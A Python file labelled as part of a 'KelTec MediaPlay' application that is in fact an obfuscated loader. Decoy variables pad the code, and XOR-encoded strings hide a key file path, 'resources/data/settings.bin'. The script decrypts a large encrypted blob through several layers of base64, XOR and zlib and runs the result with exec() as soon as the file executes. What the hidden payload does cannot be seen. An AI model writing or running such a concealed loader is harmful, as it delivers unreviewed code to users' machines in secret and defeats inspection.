# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 886259 ^ 719108
_lx1_1 = len("7418fa")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-414608)
_lx3_3 = 712471 * 0
_lx4_4 = 724372 ^ 692615
_M = 'hMm/DylGZ6E5YoEvalekBVrDzhDKg8r9QmnmZRRTSifWxKAAfQFm5Tcx3ygxAfIGC5GSEceBl6FCPOYzFlEaI4Sa/1AnV2bjMWaI'
_D = 'NrDmfPmt2/XQZNVYpl3m+TVe+v6tVTbncBScFc90BdsXVCT9PwLEelvVrAqdrovDX33HiqmJIRcCshuv9GeQbgjeiqBgPhi8UgO0HYubP4mv/e/0EqZI+0DYQwJ1JCz/xZIhgth/tkktROnE/EDQWOsnA8RTC8VXjsjKU63jHhh0W3ma1PaqnWXXP4Yyqne8Zr0N+chsHHH9OGCOrHM8OvIU7rb+0KwIGZfXKx3t7gHXklkE14t/0SmzzUJ6cAQHSYgatEBXLvhEKOwpdc1xdRWKqC8FW6ZVEvaqhuMQvOc5xJiRzdqvYdQ7YvaOWkJK5wED9hzEtKsByjtXCVjCoIk+nf2vRag6aVPhTXI3S36Kg5LVKVJ/25W/Tk0YmUD74ETVDX56GykegWq/2ZSt20HmkE9m1PnUP2u4HN29fRIjd54qBTGAkJf7UrNG60Uz7CGlQ6RXEQconU+4nlvyFx6r/uu1CvExWVsdQbADcdLKAbCi/ujat3JB5h75rMIKOvdDRKnxznvQ+wkAq31OxOlPjXd0o6ao0w6GQqoEGSGAhsZreVhsPRs6MBP9uF2t/SVDSTqG3qBzISO21ojUW99Z/8wd4HJV3KqJYfJNdtrH59SXrtNDMyYYtvK3WMn7VjUl3LR2bTtu+jG06A3eYp77ZugOvMBRrbK6RVpBE9gOn/uqq82DmYl8LCz3hpMHTljnPuNSBhEErE7V09kI4B0zuAf/VfjjvsRHD3uhajZbxkurwtrvcQUrpKNLm4OkgzGOybgZUf68hDHXGoo+MAaZGHEQ5VY1hlqUBYawB0EdYKUT+5mfiBJji05KP6B+gm1nSi0K69zaWCb/CZydNrGN8VBOapM4WfJyj8y6liWhXgsatFxg1OQKPwGArK733TS5sENnleGj/8mWsZQnTgC0qhgfDHdzBBRqZtchrBY3VPCvIzsqCy+2AbPHPIxcAAlkNnK/bij1iPMSFcBFEivtTB7BLyiccvJe8XGc1Wo9M6tMnGt+PAxDTVxZbZKeoR6KSr/swzMwe2cey5R+GKqxZGgEr5saZzgk9oSAO7ygUdv/8rrPBIIPoJJNGrH8BwwWfar4VA3w2rlJD77B5k1NpgiqpH35VPVM8rFIVG1FPOJXp8Z/a/vNJyENCLJJSwkQCATpTvVlI2ud0cW4nT0NCr9/ja7OxxJSzPgrH230M1mOoZvz7m7C8OhbOTloysqpuH8/bZJ0W/0GXtBOnmvtr4nqwGQLc27fSCWVVEYPGgSerda7r4RJI+BPazzQmv3T5QniMXywBDMti3yQD8ajtCvGnr80J6e9m+HW7Ja+HmnU2ZCKI1lI9c7huT8mYE40mJY3OpB4PgJSCAUwfkNNBA6tmxEZAomXGo12PkSxEqNYOhWZQxFZ4CSpkFHAObpzpJR96E89Lk54OartwZVaNyJoS5NycX6wy6X3c5INdkADsJjJeiAob2nf8dit0yOIYlLcg/4O9cV137+8gQcAPSYkzpwFKBEmyHgmjjO6lYWPIxTvtUNdRIjCMCh8'

_49e8=[153,229,218,248,17,214,130,219]+[65,46,38,236,231,112,97,150]
_c686=[162,202,121,68,117,176,109,106]+[30,16,202,181,108,70,70,185]
_a89c=bytes([a^b for a,b in zip([235,128,169,151,100,164,225,190,50,1,66,141,147,17],_49e8*8)]).decode()
_694b=bytes([a^b for a,b in zip([209,175,13,48,28,222,10,25,48,114,163,219],_c686*8)]).decode()
_42d1=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),*_a89c.split('/'),_694b)
with open(_42d1,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()